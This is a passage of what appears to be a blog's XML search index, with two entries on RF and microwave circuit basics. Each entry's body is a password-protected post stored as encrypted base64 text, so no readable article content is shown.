o8tWxUObmzqnn6JhrPTA2MrPyU/NLpB3ClgR3x0SnWqLmBtPJq9mCJ5vpWuZAoHfaHVMJVLafv+1SGeb0lEzszIZjjKH6UZw/W+sec1XjwRat0SNiUyOK3oeiN9io8OHfs4iZrOVVDpGleHgZu7rg1h+AE8ZIFeptB2nnqXl5RdudxuwlkXWvPkmW8MAKhDhJ/BF7zGwZZ44vgeUitZFSxU4dZtRnAThOKKiFB89zuLxZni75MWF10WWZt57t8OPca+AFYLmEw7SNgV9gY6B2vm/MjlWpTcvrT85JPcxn/fQY2Ct3gZwMKyak9YZ8NUToTKXSTw5HtKHBWQ88ZJ/8uNAnL86GiyD5/8hawmYPiVrCyT+o+Z3/3CpsjgvilEgaW4YhKigjtsgr8I/Nn9Zzn8zEZXCOOs8OguX+1j5oxVLeSvP/SmjrjlsxVdiHX38eSq9xpZflgbtZNJj7n2QIZohNDWC/jNZwxRtN9svhM1G5xeeqxyTac9oc7EuIK+pUFUQLaABOsHjK6Z2xEcANB0bo9ZkZw+fLtYjYFZLlmDIOCugaIeqooRPTo+6C+mtG9bRJO7KnHSqC+v8OVqq8kuhhmXe2gzfbdVUmSaYI9X8TlFHdqDYNXg1ExuuiI8CSQ/elO1nwKAOCKF7qZoPWpmeRBJK7B/bosvt7ludcynV068mNPSQGRii0sXaHo3MiidgoaI8VLEegv6ST/owpJoBBE28wXD573ovdD8l4939CdJeeqM3NrL7zWG24rpVQkLs5a+uJR7GrCyHeAaljjvkAKvAmzw7UeuOmgE0fxi0osw4tP7xIP+3XTqxrW73Cxgz8anfQofhBD60nSvdqeRzz1Y2kkqan7bSTJabjJGU5V20yHxMFoJDAvTmq6O7QKf+bfbyLlo9unMymJjua9JEq4Phe+NICl0Aa2lVLfC1SOtN7qwNSFPhhIjmCreBZF5SIPZc8GiNaFLn7yLftCJyiJ6WmBtTDv9DWh9ME0UR4CAKghI7U/jGVUWq0cSOdaHaM0KQsUPMjLTDtY5aVLz6J+AmeDrMvCbn3zyJqyxkemXgDZHGd9fo40uvnoIijv/GN0Yfm1vAmR+9TUZDy7bCfeZKvNJgxWL3yUmV26C7gLB4dxn3qa4P5R5corpPchT0CO1zqEM/E17xPOwfXRsq9p9NKTACodVm00Ea3zUvYPeTcGejdOjQXZmMKb6oShIpQH0PDVCczOhOGtLXrhwL0ZNBch2eJGMd0v7d2fxs0/y36gfnd6rkRzKkm2Jrv0oo3sHl/tWjQJjWYI7ji7ryi9Qgn6v0Kxs429FKlxwQ/AdBk2xpX9NoChUg8COvCdSPt06WSdFiah4CMku6j0GlKrAcgcYdYl8zALxK7VW3E7oIMonnLYBjlqVN55dLGvIUs7MgFE4Xgh8/8SkCvhTRF+/BbjvJSO4RIknG1SkcCU3n9Ry0huMoGhYkyrHLaZ9kIPSCMH+iX3tcSdH6dXBJFoLT2AOOEe/GkVfT04xIHRZz5Ly5F4nDYdRfnPWxDMY7XhNUN38lYRYSuJxntxGSoQ/1uFPObmODSetVY/exD3sr6Fv8ltXv5h1CrzhzfMqZe5Y6jh37M5tyc6PqA/xZUnCIjynzoZ7ZKSurfPPbBU8lCLYNCSVGY/8qk8OV8KKGhs+tZOI4Ta6CCANU3GYHcxWwg4HxsTXOufbfCVltw5KIk7SNNHJYhx2xUHQzPFLFncAwbi1c608SoZG67/o9UTEKtz9P4rB+8F++1ayBT4k9IIIv5IJFWzp2DvuwwSpgC+mSl8QmTSRNU49MmI21lu+Z0v4TvrISEDHiqWyhXf2QbWXbuCSzadctHPB5+KTcOVEPzir4XZznSSx7bbxMUY6arGTQbaJPiomD89gYq9NlOYjG/vdjzVnTVD5WZLiyd5RydLgtQk7vOKOw6r/vETiDogO0xnia5D8cL9F7Q/JqWwZZD+q3CnmNobI+H2pG4cIPHD1WP/0e8pRud9idXO6/3uU0UZOFaB7teLSIkywlRJ5kLfhAGNfhOQ1cSJSFLO+n1prrSGk5cCCvCkLQ8HGggxIlryd4oEeI0LFXpQxdbLPg7xcGZDB9bZIfMzrDkdyjqSsyZQTMFA6z8wFRxXg+pVrPJcNy1Au7XYpQ+kXzUSN34yaEQEm78ugxXYr/ri5NBo1/4R4N0NRe1A1TgRMK9ByCUeHxKu/ElD8zPHggzKV8Jle8EA9zvJJ+daOy7uJBz3gMjqca90dAzcDMDzhhAmjuAJVKhLLw0AmskiVYhDPI7zBxkZlDYa4ZdumpbtqFrT8a2/kP12VNmQvrcScrRMeYHnQhXT8HNHMD+QQB7C10MUoxyJIUNJGL/kjFTfZLfVknL1lUH7wAkirlcO3j//qW2EDRXKaoyHg090spRNPZx37LKc+d3q7aPmn4zzNsLMD0ZK7sev0DFqlqQysKRFpeC3U/Y4guIKP4vPfdB25wV/Px5waIwuqmozqLX1DxWB23KpYcOKiN/TYLhbfejf+nHXN1DrjFqpX19enSOtKxZLYeX7fUDe1CskLG+87coKhK7/2qetFL1PbS60xlyZnCG/vvIg8kC4BLs56pl/2lbKZvpZbUNWFpZSzVsS9JK6SOu6ARqBm3RHmT8wJn+/GbDk0q72Vv87LtPSlVrpERLADUQxw+ea6jV5qeucKxbjrsTHAdEDelHHDbLoNYW85LG8LrFRTKUwCLXMQZyiR3dpz4wshiGhFHqP73ExLs49zLq8CHqGLyIVMF/aBCqJh620M5e6udY1rGJKTcsAZkpqeybJiwD0OmBN43fFFYFaAJfcPqRhLp7gzSoFiOzSqKzBA8QsMP5+z645syTcW63ki8OA6cYlKVXFJfNEcTlVQdqGM/hVLEtMocv3tLPL4nw3q4f2mGhlOhy/FMAsRPIUobTL0G4xRdVVh1C3XvRu77Wn5/0xwONoS5nGKXQtLU8blbAiRbDtEwl7UD8S55vJ6a7L4VB26qtvpOWKNzGjs9Oy6hkb6jCw1YtbIcOnQOc0V5sBMX3Xebxm1bq/h1K84PuIfkVPjYDLnyPUdHSOCQWs6z/Poz578GF0IM2sQ4khYg3Wa8ryM2S+yYwnEIV1k4DeACKDW/mTOV1mDwe1ruBiyfaupPEr/A7pHQhOCOF5Gi0+Swvuq9Sm5aAAgeBBHXIgs9tLHxxLLuP6Ge03bffi64ouY25n4Rh74MA8Ci0PGUmUTv4inIsvw3HPUwO1rzw2JqF3ZrP44P2vsrU7l9LidtvYIf+EcCVLsWl7O4YB5358CQicHgSLTXji65WUD+iAlDCh9eJQRJpTi0fNQ7XuJaVg+mUSpnh6wyt7Fcro+FK+gQ5sqbM36j9ovcnHluADZGWtMIyl8PD1kMUlMEy5GpSdglhktyvekGMoFmaZFK4GuGjw+3VBBm2ORT709oy4L+FyMckGSbTVsDFugel2fz+FieHFUn4+cL7rcxrJ6pHekuTRU8zIxX2zvUZBmTO4HZiYW0uGWR0Lar5IlbldryuH8Cg3ZMDeG/b39XrVx3BbCfNpnU+g6PFQi/Tccj35nbCGEtjuDlQEJm31e/lmHM709Wc1flWtwizr9XWF9P/rwKUs0my9fGJjudwd8gHt2PCGU9MPJFGORfKyIsL37J7s1uNTU/WqoFqlSXw2tpp6zmrVhHvWgrFxE9zDxk9hzcSA1yy0Nj7TAP2mOeMEKl8oAOsdLgosW0pO2P0YS5FMUJhQhHbRiJHHeuraRJn2aOcd6Fnkwdvk9Mi8cteyiUeGLBpRSUPKPBh4cm6Ii7gUbkuKMwGzwzTEhkHXqwqMz+pe4jmF9En145THY7ym0JXVgdeIDTi7bu0WnwZNwqjTMSsl1Jd/iaMrUB0DB2ONc6jpSJqyydM+rVskjndueo0tYHuG1qqxTQz0nrMCBl3Ed9rlJEVBr7ZAf2MGVgX5NF5o84dK2HL5aTYtx1S6EkIPPt1kdsUqwM1GUdcUfXinBE8vZzgx9UmQ7bYi9T9o/0Fk9pw/HefshcFbyds3Dvt8mDZbuT/Uwl3lDybLBiylZqnctfhW1edsoeRSLtpc/ghRyabgW2y04tV62I+tlz3MbAvr1ZYYVjKCFuyL/HWqtkisvcEo1Z2h7lNEZe2v0Uci2h2ApK7Z2CPMAlJDZScJrtFPuG3sHxyRwrjXXERVwTinO9PYMiCzJY0Th4K/xtRdjPgCO2j7aMlcJ2TME5z0RR7v9ceUzPLQxsqB4JRYGiQuNhP/Mwr7JYLHzndaSw7GVAzzWfGeX9CjocY7zKm2r2mi/v8mvgwSwCgn8LgWopvMSwJF+oKM1uEJm2rsKZ3N4q/GNvtgFkM0k+DUlsf48qt5G/GAwSYp7nND1Kw29fBeThH7EnMJUcSE1lP54C2amLUlW0hQgGjO8tmWna2Iyq7AxsL7NrC7lZBU3x703ZauUbyVcnAOPEur7dG4eLAApKpyofcoNXnkpP2txfLB2CGstrGGjDuG0RDlmW7dcineKIkdRFoQ5KaM948+QluzyEtNo96xB6x5HQxDp6REsVIaVRNVYsgcXYLWKMHtaMo/2bh465AlcTeqlLhyqjpJ0+IFUGS/UtOj6T7/IMp5MIZEME0sqoFQpeKXVoDGKl8rKpXLdbq0in4im9+s9UXBXEhDtIDP4OIvYh5onE8KMyxsQwkZUGyGaCULvcTfEfzAvZuOi5k9QuE38lUtj2s+BLpvP4iNZYsHXCi7oagPa4CmDoDnVEJ/1GeMjzUqBKiwrpALJRm8Tb/PXqcUJ9u+tsKGeYPgGwNtFjkBnpG7GT0slV0nHrJRraS1fQnsUOHqiqNTYagY0EvuRwl87tgye7pokf5+HJDm+22zQEgOZul2j/7+0bAkBRZRni+nb1D61wuL71aGu1j6fALb4yzoVlF9y/UbWAIctO0PObMXUXnHZAOftk0qz+NB5Tm7wSFsYwTp0KgNvI2UwZLPwcCwv+CHpEQvmiSw8usBRp9ZjJ0lHBunxw6xOeJW248HQT36+Y6fP3uDl/WS8i+8oG9ZnO6mk3vjcDvXhbGQwLmqEWHCI018IZdAfzRf1a7kSgBBvU/ZUTyEGhMe3JwUD6rGCqK77w4Fx5EPH4L4MXJUsTZRuNd/xYaF2svi+Lt43DfacxqCeHn+9EpwDPvmNGqtFXQ7AjCNOjZ1KxcRXIBCvjacz1GGoorn9y6mioD5meIvKfCeHHca1jK2UGPk83t+sFBsdyCnPdZY5qbjRrlBrrF+67w3eyenIJesGiNc0/EW4R/my2lcKIBGOXCdwmSGEQTEvpsnVSryeFTGdU1JXF0IDByboluqQFg6ZxrsVU5nG18qjQ85ARZlKNMpmH3xcpUSQ4WLcfE3kYgoSmelGZrxOWoc3GIf0rT0GGaSZJ1gicuJjdvqRAZ5T5TWG1CempBxFZWDOPmr1s3GnVMlEUgzJmIoPqchMrLzSGyRBRA5weIUksmRZlSaGDGPTiXSpgtu3s+RgTUCSRva4NBv9QvC1C9na2nxSfavCIwycM7qif632nVGycKNDOGTIfYYF9ikbjNVLE749rYoYxW8lE0BF3gz5B53PzveiCeKhMYsxF4/rIPqAh7Wcu7OKM/5a3oxLu9EP+bYKnj+VYQWoamiXzwPB/1GqPvhxIpJDFHYB7vEQ5eB6SUMB1bmQhBYYods+iz/Bvb5OB3oIaeHONdJV/6uKhW6W6MKKBYSsJgQ0JVn1WfHhSbRe6O6hhQyz2+Cjqs0ZN0wWcxZzlGbRGyhN8rx1oCQ6qyVdOVnoLSS6eIDIPcLD5vT7e1lY3UKcXa8Fl1wSby6a65NAf3eouFxkzYhulKI5nrXpBiK5r2dYk1knZXM2bSHZfFmmn7sKpWKbItPXXLUjUooSnaViqvsMFE9A63dyMAc31XwEW0imiNIpX37TrAYDu7/q6pRjorl/5NCkUmQkk43wmn+sVD2+RSQHzKs0OwqxxtsU4DY0XuKRcLUTEIyZk84ZTT8iVhLvpu5JWuGUrSfLDyN6EO0Lx2t1kw9DrERqZsaEdsQybRzaRe9Ya8/JxuplU9sac93Vkcr7EH3PxJbibm2hw6pH/KsayIq3UhhtsS9aDn8iHuiUKKP01kpslCimtevJUIidU7v0wTHrR8DHAlYX20kr2IEdK97GJozBzPL2zSuAb9oVnnNoBVgO3RJ5PplQ2IkCzM7Xbw3sMUltLNf8Ctj1ut5EPGtDwGhT7PdxmCYmC3uHEuMbFfp4k6eLMeoZ2/c8tQB6HZQ73NGy5pQC2cny0pfaiQl06w3xnUTcVlpHyBYcfa0+vXgrJmKKaVOPS0nEeF1dOsUli01JoRLJ95yhtVaOpaH+0Xb1mpUwDEb3PKF2gL0xLOW849vyaFek2mT08GGLlPd5ZnZ3hbRcwv3SFjtjQ3G/rPVg3E0JDN/tyAxif0zuLYJ7QkwA2+PFigdEXhcdCXLzEAeMC1phT7NiYfdvNULc2vZcbCTmtzltvab6SyrTF/MCNsZhjXSIBN+C6uKoksVLOA1yVBalpcHw1UN1RprgPYKwzHpIcvhiSeMO8gDpK01TZQlXhCWzfbTienXOKa+zKCB8V1AJrNWEDmrRyGmL0Mlw3Owo81RW2ptSbJOT450wrsFM49g6ukJtTJjC3OB0EtdeAfhVqiukt0icUiLVkgaJSPKfdEsAtUMdlyTfODMR/AfWkWPElEnp07zh7MG2/o20kqbYbLBgeSCSg9Ekwor3gae3x8i9l5skBOFGS5Q2Tc7Q0PfBAeu3XsdsuRh0F8pPh4QTFQMMHnjUjtrvjJzUkjQmLllJpRRSNkpre9pFWsxyvMSLoHwwxg0NBjkjX22z6w/Rj6cm/nxQi1hPKXowwt8quQLLkV2BLUXTPWBUiD/2CqqEH5or2oUAXJZmU3EMw5T/PQmyW0O9YFerYmlDBrzBTX7ScX/uLXvPHYJeDoLS5h7xiatnhOB6OoOISBS4o3DO6+b4TbZMD8QTkVOJHodEvzzI8P5uENWao6hZXW5yUDijpHOf5Po0hOHyktiMnlcSLn6D/lgJvoSe/8kGiWi9vpYotpmxAQj6Ue8tkDvufA6tz9C5AlYh0oqJO0fLtXppT/q/A2S5xgV4E7YI3WQ2JI5OJaK0aoA6R5A5kgNt1L+r7RQdA2d5WyJ00I5S2ubP4pmk1RqG7ZIyQhQ0fczyr72aJNHkXG4uWMzJrm4el4gkZ8aus6bZRd8R84i6BHIEhaQxx4fGfcl6tVufTfV/IfPsUt7NwMoBQo0dCfi0rp59VPbxPr38n0gn/WEdlre582ll8sp4W75lNZmnnubAy0Gwq3nHxBhpT79d6jL6vpaa4kMA8FESqwlQzQO0rNQSUD+vL6lOd8gmUGsBTcH6WYeFpLDihEym+pW0YmoVGflcJYRjvmKy2MRA7G8aIFI4SVgkCm5I+10ns/tgpu8yg+UEU3Aa38fVUqstfjAEM/QDCzZJKLj2MNgu7ZFPSYRp2CcfTL3dZ2HQORU30nvGGyHY101nQmZKeizCR6o4nDKSe3CV5zs0u8I0TLrOPL2beX2Q9vPEqI82khsfpcQhRdAp0B6JXcM8BjxqJh2fu3T0z9cqPGyx0G9f0cduPgZaT9zy2fNGbgZksf6kXZ+JR2FOw9nmyzPHbvIM4W4Aa8x//NGqRhNoagCLD+VgqYqzlSCQVs8IKab2LAvPuRq9bQbc+ZnVweoWh8EWOXiGNZeoYhFTcyCKTpe0qdkzVZB01VwPHvWUlDP1SHmEgWE8G9z/VU3BfiXcM1g9maVW5VJKolq7mSigEok1YK2cT4Vdn/8RjtZhEX3Ly/kotKZszreUcsqz4tsCkvkKeFqenDu/+nXAGzCUUtV7CXen8oAU8oTvr8uwBHUumyOqbh3jPR8i8J0mafr2PdTdFAut+GVt1VZFcXNZR9YDUSJZvWrGtCXdxcJPHzNU9qNHokw0hrNHoWQXK58DqNYTrDR1HVK7hj598A8mH79TRtxnbFuZ64Z5/5I3AjdZaPfJ/Tg2I+Alg8cJUrnfrYAlqmNfY3sj1myNEFWvtIDyl/h3a68PS74FAcT1oRgmNE7L85uNyAuc2Lc4Zp5yvapLFfsq20cJFOYaakF9Wd852RiITlmlZxaxUyaPxUQFES86dx7P0xbsvUQ7ScunXX8hNxcGEUXMJxy6AF5cza4umI4JjM4izld+to7oe+KUROdcxENCHfzDGemIZ+0gy3ImprWo39utknHp8TdskzXd+0TF1ZSLGW0q8koa4XzCxw9Au6DNXeeNNYG+h18TO6VQB4J5I7ZjWxaY2H+9aEe50KXyZcNF9MatLhLJAaRgADGP5siFLsucblVC1pE9MpDYKiY4qzsaNfT74KaSuraBenoEzSdIMSNtUweS7hHOc1D/WxPxYyPmVloNuTxF+Vf3w49mP/JML2XUJ3WJh4s7g1lhxOWCsuUrJDmnrm+AG2HCiPUoJCC0Yc/hWpAAflqC5wVjNbq9cLyFlsUHI+tHKkfgMDDVSZEkwMoVhGXoeiK9vrDGTAjQqtbYPfIIhORne6J+vvzV+30wEWAvuIINRSbkLwlPMR13T9o8UztuwKoNZTQoaKv6M1Z4WRhL+ewxHREj7X8/j3B16F+jSip1QYrJX7WGzl5K4abp+AJWafU6cBd/9ywuw6Lcmhz8RN4eaUUBCZO+BzzQLNtmRqkb/sjMSbcsBlFVLg4ITGjePBulfz4Jbs8kUpZAdPrHlFAGyOqRbsRu5g3r1uPGsm9zw7We7yJ8MgiMl/zLQiPVnvvquP7MHzSFYa5TZvPUaJonJl+JulDuDkcrT7VScJwZ0UGZ/r7YK0e3hMe3VzmcJJstXuXj0yAUT90MXyIJzUsPz1OhNYQIDnZXtzR0Tzc52+1CiiUgQ4P6eWl0XsdLHgIXsEPoyQorucIOLqn1U1pCIrAOB5a9sBbCWjxausXiOBfobBKYAMgPy+Yu7fY7vbafya6dlmeDqPwGEDE6O9eHHd5bpJfh2c/rWYGPWA9uMEYlLWKpnyH6XS4NSc1lpR0VCpornr79DTJ9qzIfg/yQcy/Hfzz/8qfAVWiio6zVE/i88FqL4UOyV5/mSCC5jBD112nmTlKaCDA+xezYDjiGd0VahGidFfv6EFyxrklFclpbxvebnrf1dOcig4DIUSdDcfdZ7ul1cOE+Fwr5ybhzBWIhzq7Y0RMHzxigolAdWdv5B6IU/TVZiclWLi2eo3rNC4z2DXJdfduhPH2uTK625R3fG9LFOU6/uTNFWv38gAelfgoPN6x0+UgytTcuORDN+wuCQ9PQ40VjHN8B5+MDG4Pgxqc4wtPD1MacLdhpLuXd4vk9XrEaXM8DzBnLY+hqL8QfU/wtT/ij1updlg39Pm/AV68tAB4TnIOghAmyxXNojgVPERUwzP4HCunP+Co/5ibk58P7Wxfv9gZ0f7d2E0XfBQDlYaN7SVrNxuYvqxgL2gpjJk4olNFDP8lwGu2eXMD+8UU0Wf4vZJE8A4dO1qGUCwhVexKeISXnBYHnNU3LrYP0+hBlf8bp/ds+AYdXZ+PtLpDnKR636qud7bqSxZnbxRrvBWoxieFA02IBvABFvJUHEBddc9aUhfjM3oDlrS+ZS4klVtYLmvMf4Ed2jEf/zE8rxfKExqo1Bd4cad6NjevlMKTeqm5cbdIMC+rGSwT/2M216MuhNSWk+cuzkBHbdmxCpfjP7QiEwmrjHIhB/Qn8/inPKgi09SXSD97AyeJS0Hpgr6Xf/te7JZo/AimTIBjIRKL0eSCQGy2Bcrv7ATSfffbLDWOxMvcuLzY4Ln40G+o+yLnbocn+xYOCYTmOt9ZreCUwotwrr9oseN4gF8z/e4Oz7vHk1yVOkzgSLpyUV746fOfbL4XsfDl+y73d3tjL+CvU2y5xR3KSeyiDDKFIdTXqJXbAOaI90WbGz32pa1trnzMXLP6yEnlaxfP36FnANKBnRLf9NojQ54gymEz2B30I3smTQ5Z376q/JLPE56D8wH+ZbWPTNvx9DtRTbLs3FHBIgrTHx/07k5cE3YRWklfUaG7THPErwAsfdkBLgCUAdeqJYq5oEZSmOaB9w4nTW82GZJtgTrlp7M1Dw6V57b4pBK7vbIWdzrBURk+54385K4QtRvZbArzfQXsV3UNKjlUtoIMl/K1ZDBfTUViTYozKgNPmZ29ZSca5Fv2XXv4bwnmYZ2V6B70K4tqty+Bw+7sFEHVh3trfrUa2WMtfhBJRgfxkRBlfkoI7vPE3Hq9+Zxp+AFaHD3OqYopTrY7jbl3WqQcX7dMYxmpPfbsfRDjMpR/3tJY1TrdNpq7X0LssAn5k101GvtL8eZFrq+ImAKj6pa9aH0+x09CAmju6oviUAQFVabyTdWxG3VrBK35BDAU/lxV/EYACI/XlbeBcqyM5fpipEKj19Xrmt0gKre4H8V5A2rBUSRhB/N/ScFoJAUdgksuh2E8ij8zNIxueFE/RQ5WcBxuxnfsK2K97gXdj6lRTSEH8HL8vr5y6GEeKEQcH4CrX4dbsm0pgC9Tl5apuNRAFH4Ri96AERgqqpCNCrUKZgXb5Nvj6QN0YVJFnHuGtN1HtlWedaPKJJv2PFKTUOZIHpZ+Wj6OM3VPOA/g0lwBw1m7ZnKSCduMyrXKmJHGV0kNLNONgBxIpUtria7B3QJJZ2XDhvSey5gybfUvnf2ewUhqCGe5XISvK4jJz4EHS0hn7r3ifRRFn1E7GANF+tnN4IPtAgjoqX2NYxzHUOavlgGSU2RyxPVzpDDhkIWwD234iq4HISEJ7hkddTzzc3ToNiPWxpkV3o4unlWAQUg/arZGaOWyKHeijOkiSLrLcq65X4pmFtebsZohmaKzR54nAAUEgjZbyvWBP8wOLiQRxNWVlp900FnSjy6QtipwptseUzM8dOdta1Uwu0sDEttmhgHkVpEX2QHWSq/5soeQgaf4YfMt9rAFbfehoMQoXAJtFd7ktdbs+ocmAlxwiq++mooc3eXfdz6SGBcYcwhCKn403UKIZSVl2C4yBxn6PJOn2jUydSI7qy+UImb2jrRcBA6i7RU8WQMh9pQwiTHdGmKV6Jp21PE1biTg+1fblDOLKSasF8otc3/Khz/x2ershEc9dJvuCzYMXpX+ajgrYtYA8O5veGvWuH0Vu0S3CqPXcH9UFNRD0NXEWDLxtlNyCQo2uX6Vs0MTWq5sFhUFvYG62rrCj0UYLExiccznM6B4nX7sSQiWUUxf2wTftJTxc/2jUvEwE+tznNaHyy8HD2Ti7MC0Kw0Qqfrp6roO2+IbC5DX8OBxAvBKsf6JJ3eARzG6fGYbq6rHcbiZYzaEcPUeZLRw8QpIlaZDNtWiXhRoBaEjbz9ko0F06cfj78Vs6TRDWTZJzAOh4qAaCw2MlIIAXp/SmAVwlUuixHgwNPlp7zuVsS2iM7FlU2MSoHfP8r3W7HjAPFwlutpj2+AyFF2lMAQ/KYaLJT4K/LWuiWTYkUlzY0IlRt347iyu0iFkog92CTllYJvGLdd8uvUawkVR9Xqb/ZJdW1cdze6gsvN1Mu+8rrnQyuHLwPba9MP8Yvl3DgLe2c6pqIxKv8bJ8g6weQ0tJD9+whoPP9VR2pAmStptprj+KQMVdiJBXINlv13Db1Rt7Mtqi3HXoP9xKBXOGlQnz6hEaL+wGy5KxEN3TiyDa3kuQQSb4VVbQMBnMlY9Ou70+s63QMU90rgcTW1eKnMTDHfWzZYolhEaNE8upK/InhCn+H5kZR9o4eVRzMGHstT2GONqSnjD93SrJ0Ywj7GoJtqiW0WWLdShnjF+5VIa5oOzfqkSQuVwRHIlMF+Y1/EOOElHLvDCO4E7pmIrqJlQcmbo1Jc8soBN2aro7CdOZR3rlBra8q+wSJGIdoX3K2+1ltiTaQelLwNpUnuE8jrKlvMJKeZcTBFtlhknVtKTLVUt5zv1Z4fGeGRSOHNGUfXQU/tIj04i64U3XWBD6QWQeasJu2uC95d6xYbk7d0qpSZhWi5Y3Bw8wOxPQIauQj6/OZ/v7KcuqveQiB/rxspeFAvYygetRodG4VDFkx5eOix+FKI+hcBn5rIyFHFJsvsgYzzdgPReQEwbd929n6Cf1lJIiJnTs/6dd2LpB2m9QdM12ymyv6MYfYwQXk2nwdz0vEYuDqZ1iD1LDjdGmsph72KlPrKdp+uQMKHnHbKq6fksAQ5BOn0CSospp3Q+30Dm4img/yca1kDIgZ9wVCnWASdlxh4znw47kzUkImoXZ26o3bbHHHg1CZcP/PjFRVEW1fEJtzfZT22hQT64hVM8sWn6fZUTysgy3XLixy24w5SyaxQW4u/1EepuqMwGQBUb/RchYk49Esj4nCAv4L9B2GLSbnJsggH/oV6Hi8eKDVUaX+mWIPXAsoiyjmnRQ2BWs/FihoGJvjfh5eCfpb7O7u1ztTsAhAaST+jJJ6nT0PXv17qWbH0yNFkGCwmZ8wF6rREyZu3Rv/x3UdEjSH1yMh5nncp3KeU1FcG74NqoQXX8VPgqonjYGGdc9ZG2p5CG7EoE/eo7miZQZe6JZmqrtmYNE/VS2tUS8WtyXU84Fk2iyqXk5RsiGPfQTBzPEdZo3/3sZ0b51W05Uzb00b3o0fHIzYOjTcHoa2Nq28o2iAKnm84/fmwcKr5ywxOLzEStSFwYj5bdGz32qpISAHmqe6PJ00x6OSd5HFItYDJeXZYDBzBksutLzNi66yawlRfsD0sPKbZT11osv8aoqsj3w/k9PXHFO+JRZBQ23lpnbG5C9lLreH0vSTQdcq/DY0fPwmg8UMOW4iPK4OXyyjVoU2Lw==]]></content>
      <categories>
        <category>RF</category>
        <category>射频电路</category>
      </categories>
      <tags>
        <tag>射频电路</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[射频微波基础知识（一）]]></title>
    <url>%2Farchives%2Fddedad91.html</url>
    <content type="text"><![CDATA[请输入密码 Incorrect Password! No content to display! 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